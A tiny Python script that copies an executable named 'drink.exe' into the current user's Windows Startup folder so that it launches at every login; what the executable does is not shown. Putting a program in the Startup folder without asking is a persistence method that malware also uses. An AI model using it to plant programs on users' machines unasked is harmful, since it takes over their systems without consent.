from shutil import copy
from pathlib import Path
from os.path import dirname

startup = str(Path.home()) + "\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy(dirname(__file__) + "\\drink.exe", startup)